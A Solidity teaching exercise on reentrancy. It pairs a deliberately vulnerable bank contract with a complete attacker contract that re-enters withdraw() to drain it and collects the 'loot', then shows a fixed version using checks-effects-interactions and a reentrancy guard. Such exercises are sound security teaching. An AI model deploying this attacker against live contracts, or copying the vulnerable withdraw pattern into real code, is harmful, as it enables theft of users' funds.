// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * EXERCISE 1: REENTRANCY ATTACK
 *
 * This is a VULNERABLE bank contract. Your job:
 * 1. Understand why it's vulnerable
 * 2. Write an attacker contract to drain it
 * 3. Fix the vulnerability
 */

// ============================================
// VULNERABLE CONTRACT - DO NOT USE IN PRODUCTION
// ============================================
contract VulnerableBank {
    mapping(address => uint256) public balances;

    // Deposit ETH
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // VULNERABLE: Can you spot the bug?
    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        // BUG: External call BEFORE state update!
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        // This happens AFTER the external call
        // If msg.sender is a contract, it can call withdraw() again
        // before this line executes!
        balances[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// ============================================
// ATTACKER CONTRACT - Complete this!
// ============================================
contract ReentrancyAttacker {
    VulnerableBank public victim;
    address public owner;
    uint256 public attackCount;

    constructor(address _victim) {
        victim = VulnerableBank(_victim);
        owner = msg.sender;
    }

    // Step 1: Deposit some ETH to have a balance
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        // Deposit into victim
        victim.deposit{value: msg.value}();

        // Start the attack
        victim.withdraw();
    }

    // Step 2: This is called when victim sends ETH
    // TODO: Complete this function to drain the bank!
    receive() external payable {
        attackCount++;

        // Keep attacking while victim has funds
        if (address(victim).balance >= 1 ether) {
            victim.withdraw(); // REENTER!
        }
    }

    // Withdraw stolen funds
    function collectLoot() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// ============================================
// FIXED CONTRACT - Study the differences!
// ============================================
contract SecureBank {
    mapping(address => uint256) public balances;

    // Reentrancy guard
    bool private locked;

    modifier noReentrant() {
        require(!locked, "Reentrant call detected!");
        locked = true;
        _;
        locked = false;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // FIX 1: Checks-Effects-Interactions Pattern
    // FIX 2: Reentrancy Guard
    function withdraw() external noReentrant {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        // EFFECT: Update state BEFORE external call
        balances[msg.sender] = 0;

        // INTERACTION: External call LAST
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
